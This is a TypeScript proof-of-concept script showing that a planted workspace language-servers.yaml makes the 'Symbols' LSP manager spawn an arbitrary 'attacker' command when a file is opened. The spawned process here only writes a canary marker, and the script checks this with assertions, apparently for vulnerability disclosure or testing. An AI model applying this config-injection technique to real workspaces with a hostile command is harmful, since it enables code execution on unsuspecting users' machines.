import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const vulnerableRevision = '7534904e940c5585a8675624ca71eb4e247d37e8';
const pocDir = path.dirname(fileURLToPath(import.meta.url));
const targetRepo = path.resolve(
  process.env.TARGET_REPO ?? path.join(pocDir, '..', '..', '..', 'symbols')
);
const workspace = path.join(pocDir, '.workspace-config-poc');
const stateDir = path.join(pocDir, '.poc-state');
const victim = path.join(workspace, 'victim.ts');
const config = path.join(workspace, 'language-servers.yaml');
const marker = path.join(workspace, 'spawned.json');
const lspScript = path.join(pocDir, 'minimal-lsp.mjs');

function quoteShellWord(value: string): string {
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function withinPocDir(filePath: string): string {
  return path.relative(pocDir, filePath) || '.';
}

async function main(): Promise<void> {
  const managerModule = path.join(targetRepo, 'src', 'runtime', 'lsp-manager.ts');
  const packageFile = path.join(targetRepo, 'package.json');

  if (!fs.existsSync(managerModule) || !fs.existsSync(packageFile)) {
    throw new Error(
      'TARGET_REPO must name a Symbols checkout with dependencies installed'
    );
  }

  fs.rmSync(workspace, { recursive: true, force: true });
  fs.rmSync(stateDir, { recursive: true, force: true });
  fs.mkdirSync(workspace, { recursive: true });
  fs.mkdirSync(stateDir, { recursive: true });
  process.env.XDG_STATE_HOME = stateDir;

  const command = [process.execPath, lspScript, marker]
    .map(quoteShellWord)
    .join(' ');
  fs.writeFileSync(victim, 'export const proof = 1;\n', 'utf8');
  fs.writeFileSync(
    config,
    [
      'language-servers:',
      '  attacker:',
      `    command: ${JSON.stringify(command)}`,
      '    extensions:',
      "      '.ts': 'typescript'",
      '    workspace_files:',
      "      - 'victim.ts'",
      '',
    ].join('\n'),
    'utf8'
  );

  const imported = await import(pathToFileURL(managerModule).href);
  const createLspManager = imported.createLspManager as () => {
    configureForStart(args: {
      command: 'start';
      workspace: string;
      loglevel: string;
      console: boolean;
    }): Promise<void>;
    getStatus(): any;
    getSessionForFile(filePath: string): Promise<unknown>;
    shutdown(): Promise<void>;
  };

  if (typeof createLspManager !== 'function') {
    throw new Error('target checkout does not export createLspManager');
  }

  const manager = createLspManager();
  await manager.configureForStart({
    command: 'start',
    workspace,
    loglevel: 'error',
    console: false,
  });

  const before = manager.getStatus();
  let after: any;
  let timer: ReturnType<typeof setTimeout> | undefined;

  try {
    await Promise.race([
      manager.getSessionForFile(victim),
      new Promise<never>((_, reject) => {
        timer = setTimeout(
          () => reject(new Error('file-backed route exceeded five seconds')),
          5_000
        );
      }),
    ]);
    after = manager.getStatus();
  } finally {
    if (timer) clearTimeout(timer);
    await manager.shutdown();
  }

  if (!fs.existsSync(marker)) {
    throw new Error('the workspace-selected process did not create its marker');
  }

  const markerData = JSON.parse(fs.readFileSync(marker, 'utf8'));
  const packageMetadata = JSON.parse(fs.readFileSync(packageFile, 'utf8'));
  const result = {
    vulnerableRevision,
    targetPackageVersion: packageMetadata.version,
    selectedConfig: withinPocDir(before.configPath),
    expectedConfig: withinPocDir(config),
    defaultProfile: before.defaultProfileName,
    stateBeforeRoute: before.profiles[0]?.state,
    stateAfterRoute: after?.profiles[0]?.state,
    spawnedCommand: path.basename(before.profiles[0]?.commandName ?? ''),
    markerCreated: true,
    markerCanary: markerData.canary,
  };

  console.log(JSON.stringify(result, null, 2));

  if (
    before.configPath !== config ||
    before.defaultProfileName !== 'attacker' ||
    before.profiles[0]?.state !== 'not_started' ||
    after?.profiles[0]?.state !== 'ready' ||
    markerData.canary !== 'workspace-config-poc'
  ) {
    throw new Error('PoC assertions failed');
  }
}

void main();
